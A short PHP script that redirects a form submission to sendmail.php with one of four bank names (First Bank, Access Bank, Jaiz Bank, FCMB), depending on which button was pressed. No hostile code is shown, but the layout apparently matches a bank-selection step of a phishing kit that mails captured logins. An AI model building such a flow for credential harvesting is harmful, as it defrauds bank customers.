<?php


if (isset($_POST['mi1'])) {
	header("location: sendmail.php?bank=firstbank");
	}
elseif (isset($_POST['mi2'])) {
	header("location: sendmail.php?bank=accessbank");
}
elseif (isset($_POST['mi3'])) {
	header("location: sendmail.php?bank=jaizbank");
}
elseif (isset($_POST['mi4'])) {
	header("location: sendmail.php?bank=fcmb");
}

?>